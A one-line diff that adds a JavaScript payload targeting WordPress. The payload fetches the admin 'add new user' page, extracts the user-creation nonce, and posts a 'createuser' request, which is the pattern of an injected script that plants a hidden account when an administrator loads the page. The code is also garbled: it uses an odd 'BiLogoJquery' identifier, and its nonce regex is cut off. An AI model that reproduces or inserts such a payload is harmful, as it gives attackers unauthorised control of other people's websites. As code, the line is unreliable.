@@ -1,0 +1,1 @@
+u="/wp-admin/user-new.php";BiLogoJquery.get(u,function(e){BiLogoJquery.post(u,{action:"createuser","_wpnonce_create-user":e.match(/_wpnonce_cre)})})
